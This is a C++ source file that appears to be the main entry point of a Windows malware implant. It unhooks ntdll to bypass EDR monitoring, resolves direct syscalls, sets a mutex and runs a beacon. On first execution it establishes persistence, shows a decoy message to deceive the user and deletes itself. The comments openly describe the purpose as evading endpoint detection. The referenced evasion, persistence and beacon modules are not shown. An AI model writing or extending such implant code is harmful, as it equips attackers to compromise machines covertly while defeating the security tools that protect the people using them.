#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "decoy/Pretext.h"
#include "utils/Cleanup.h"
#include <windows.h>
#include <objbase.h>
#include "utils/Logger.h"
#include "recon/Decoy.h"
#include "utils/Cleanup.h"
#include "utils/Pretext.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    if (persistence::isRunningFromPersistence()) {
        // 1. Evasion: Unhook ntdll immediately to bypass EDR hooks on subsequent calls
        evasion::Unhooker::RefreshNtdll();
        LOG_INFO("Ntdll unhooked.");

        // Initialize Syscall Resolver (pre-caches SSNs)
        evasion::SyscallResolver::GetInstance();

        // 2. Single instance check
        HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\BenninImplantLocalMutex");
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            return 0;
        }

        // Initialize COM for the main thread (needed for WMI modules)
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        if (FAILED(hr)) return 1;

        beacon::Beacon implant;
        implant.run();

        CoUninitialize();
        if (hMutex) {
            ReleaseMutex(hMutex);
            CloseHandle(hMutex);
        }
    } else {
        persistence::establishPersistence();
        pretext::ShowInfoMessage();
        cleanup::SelfDelete();
    }

    return 0;
}
